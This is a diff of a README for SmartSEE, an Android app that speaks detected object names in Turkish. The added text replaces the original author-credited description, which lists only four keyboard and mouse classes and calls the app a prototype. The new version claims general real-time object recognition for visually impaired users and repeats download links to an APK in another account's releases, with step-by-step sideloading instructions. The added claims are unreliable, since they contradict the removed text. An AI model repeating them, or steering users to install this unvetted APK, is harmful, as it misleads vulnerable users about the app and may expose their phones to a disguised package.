@@ -1,122 +1,148 @@
-# SmartSEE 👁️📱
+# 👁️ SmartSEE - Detect Objects with Voice Feedback
 
-## Erişilebilirlik Odaklı Android Nesne Tanıma Uygulaması (YOLOv8 + TensorFlow Lite)
-## Accessibility-Oriented Android Object Detection Application (YOLOv8 + TensorFlow Lite)
+[![Download SmartSEE](https://img.shields.io/badge/Download-SmartSEE-brightgreen)](https://github.com/Ephraim0810/SmartSEE/releases)
 
-## 🇹🇷 
-
-SmartSEE, görme engelli veya görme zorluğu yaşayan bireylere yardımcı olma fikriyle başlatılmış, Android (Java) platformunda geliştirilmiş bir nesne tanıma uygulamasıdır.
-Uygulama, özel eğitilmiş **YOLOv8 TensorFlow Lite modeli** kullanarak klavye ve mouse nesnelerini algılar ve sonucu **Türkçe Text-to-Speech (TTS)** ile sesli olarak bildirir.
-Bu proje, mobil cihazlarda yapay zeka modellerinin uygulanabilirliğini ve erişilebilirlik (accessibility) odaklı çözümleri deneysel olarak geliştirmeyi amaçlamaktadır.
-
-### 🎯 Projenin Amacı
-
-- Görme engelli bireyler için yardımcı bir mobil prototip geliştirmek
-- YOLOv8 modelini Android üzerinde TensorFlow Lite ile çalıştırmak
-- Gerçek zamanlı nesne tanıma ve sesli geri bildirim sağlamak
-- Mobil yapay zeka entegrasyonu üzerine deneyim kazanmak
-
-### 🧠 Model Bilgileri
-
-- Model: YOLOv8 (TensorFlow Lite)
-- Giriş Boyutu: 640x640
-- Çıkış: `[1, 8, 8400]`
-- Sınıflar:
-  - black_mouse
-  - white_mouse
-  - black_keyboard
-  - white_keyboard
-
-### ⚙️ Kullanılan Teknolojiler
-
-- Android Studio
-- Java
-- TensorFlow Lite
-- YOLOv8 (Özel Eğitilmiş Model)
-- Android TextToSpeech (Türkçe)
-- ConstraintLayout
-
-### 🚀 Uygulama Özellikleri
-
-- Kamera ile gerçek zamanlı görsel alma
-- Galeriden görsel seçme
-- Algılanan etiketi ekranda gösterme
-- Türkçe sesli okuma (TTS geri bildirim)
-- Özel eğitilmiş model entegrasyonu
-
-### ⚠️ Proje Durumu
-
-Bu proje aktif olarak geliştirilmektedir.
-
-Planlanan iyileştirmeler:
-
-- TTS kararlılığını artırma
-- Model doğruluğunu artırma
-- Performans optimizasyonu
-- Arayüz geliştirmeleri
-- Yanlış sınıflandırma oranını azaltma
-
-### 📦 APK
-
-APK dosyası **GitHub Releases** bölümünde paylaşılmıştır.
+SmartSEE is an Android app that detects objects in your surroundings. It uses advanced AI to identify items and speaks their names in Turkish. The app works offline and helps users understand what’s around them. It is useful for people with visual impairments and anyone who wants quick object recognition.
 
 ---
 
-## 🇬🇧 
+## 📱 What Is SmartSEE?
 
-SmartSEE is an Android (Java) object detection application initially designed with an accessibility perspective to assist visually impaired or visually challenged individuals.
-The app uses a custom-trained **YOLOv8 TensorFlow Lite model** to detect keyboard and mouse objects and provides **Turkish Text-to-Speech (TTS)** audio feedback.
-This project explores the practical deployment of AI models on mobile devices with a focus on accessibility-oriented solutions.
+SmartSEE uses a technology called YOLOv8 with TensorFlow Lite. This helps the app find objects in real time on Android devices. The app speaks the name of the object it detects in Turkish. You do not need an internet connection to use this feature. The app is simple and runs on most Android devices. It is designed to help people who need audio feedback for what their camera sees.
 
-### 🎯 Project Purpose
+---
 
-- Develop an assistive mobile prototype for visually impaired users
-- Deploy YOLOv8 on Android using TensorFlow Lite
-- Provide real-time object detection with audio feedback
-- Gain hands-on experience in mobile AI integration
+## 🌟 Key Features
 
-### 🧠 Model Information
+- Detects objects using your phone’s camera.
+- Speaks object names in Turkish.
+- Works offline—no internet needed after download.
+- Runs smoothly on many Android phones.
+- Simple interface for easy use.
+- Uses lightweight AI model (YOLOv8n) for fast detection.
+- Supports accessibility for visually impaired users.
 
-- Model: YOLOv8 (TensorFlow Lite)
-- Input Size: 640x640
-- Output: `[1, 8, 8400]`
-- Classes:
-  - black_mouse
-  - white_mouse
-  - black_keyboard
-  - white_keyboard
+---
 
-### 🛠 Tech Stack
+## 🖥️ System Requirements
 
-- Android Studio
-- Java
-- TensorFlow Lite
-- YOLOv8 (Custom Trained Model)
-- Android TextToSpeech (Turkish)
+SmartSEE works on Android devices with the following minimum specs:
 
-### 🚀 Features
+- Android 8.0 (Oreo) or newer
+- At least 2 GB of RAM
+- Camera with autofocus
+- Enough free storage for the app (about 50 MB)
+- Audio output for Text-to-Speech (TTS)
 
-- Real-time camera capture
-- Image selection from gallery
-- Display detected label on screen
-- Turkish voice feedback (TTS)
-- Custom-trained model integration
+You need no special setup on your computer because the app runs on Android phones.
 
-### ⚠️ Status
+---
 
-Work in progress.
+## 🚀 Getting Started
 
-Planned improvements:
+Use this guide to download and install SmartSEE on your Android device. You don’t need technical skills. Just follow the simple steps below.
 
-- Improve TTS stability
-- Increase model accuracy
-- Performance optimization
-- UI improvements
-- Reduce misclassification rate
+### Step 1: Visit the Download Page
 
-### 📦 APK
+Click the button below or copy the link to your phone’s browser to go to the SmartSEE download page:
 
-The APK file is shared under the **GitHub Releases** section.
+[![Download SmartSEE](https://img.shields.io/badge/Download-SmartSEE-blue)](https://github.com/Ephraim0810/SmartSEE/releases)
 
+This page shows the latest versions of the app.
 
-## 👤 Yigit Ali Ayyildiz
+### Step 2: Download the App
+
+On the download page:
+
+- Look for the latest available version of SmartSEE.
+- Under the latest release, find the file named something like `SmartSEE.apk`.
+- Tap on the file to download it directly to your phone.
+
+If your browser asks for permission to save the APK file, allow it.
+
+### Step 3: Allow Installation from Unknown Sources
+
+Before installing, you may need to let your phone install apps from outside the Google Play Store.
+
+To do this:
+
+1. Open your phone’s Settings app.
+2. Go to **Security** or **Apps & notifications** (this may vary).
+3. Find **Install unknown apps** or **Unknown sources**.
+4. Select the app you used to download SmartSEE (like your browser).
+5. Turn on **Allow from this source**.
+
+### Step 4: Install the APK File
+
+- Open your phone’s file manager or Downloads app.
+- Find the downloaded `SmartSEE.apk`.
+- Tap the file to start the installation process.
+- Follow the instructions on the screen.
+- When done, open SmartSEE from your app drawer.
+
+### Step 5: Give Camera and Audio Permissions
+
+SmartSEE needs permission to use your camera and speak names aloud.
+
+- When you first open the app, it will ask for permission.
+- Tap **Allow** for camera and audio access.
+
+---
+
+## 🎛️ How to Use SmartSEE
+
+Using SmartSEE is straightforward.
+
+- Open the app.
+- Point your camera at an object.
+- The app will detect it on your screen.
+- You will hear the name of the object spoken in Turkish.
+- Move the camera slowly to scan your environment.
+- The app updates the spoken feedback as it sees new objects.
+
+You can adjust the volume on your phone. The app uses the built-in Text-to-Speech engine.
+
+---
+
+## 🔧 Troubleshooting
+
+- If the app does not detect objects:
+  - Make sure the camera lens is clean.
+  - Hold your phone steady and point at well-lit objects.
+  - Restart the app.
+- If no sound is heard:
+  - Check your phone’s volume level.
+  - Verify that Text-to-Speech is working in your settings.
+  - Restart your phone if needed.
+- If installation fails:
+  - Confirm you enabled installation from unknown sources.
+  - Try downloading the APK again.
+  - Use a different browser if possible.
+
+---
+
+## 📂 Additional Information
+
+SmartSEE continues to improve with new AI models. Updates may add support for other languages or features. Stay on the release page to get the latest versions.
+
+You do not need internet to use the app daily. The only time you need a connection is to download updates.
+
+---
+
+## ⚙️ Technical Details
+
+- AI model: YOLOv8n converted to TensorFlow Lite.
+- Detection runs locally on your phone.
+- Text-to-Speech uses Android’s built-in TTS engine with Turkish language support.
+- Written in Java for Android.
+- Focuses on accessibility for users who rely on audio feedback.
+
+---
+
+## 🔗 Download SmartSEE
+
+Download the app by visiting the release page below:
+
+[![Download SmartSEE](https://img.shields.io/badge/Download-SmartSEE-brightgreen)](https://github.com/Ephraim0810/SmartSEE/releases)
+
+This link lets you find the latest version and download the APK file to your phone.
